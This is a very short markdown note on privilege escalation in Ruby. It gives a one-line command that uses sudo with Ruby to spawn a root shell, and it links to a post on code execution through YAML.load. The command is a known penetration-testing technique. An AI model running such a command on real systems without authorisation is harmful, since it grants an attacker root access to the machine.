## Security
### Priviledge Escalations

Just plain ruby:
```shell
sudo ruby -e 'exec "/bin/sh"'
```

Via Yaml.load:
https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
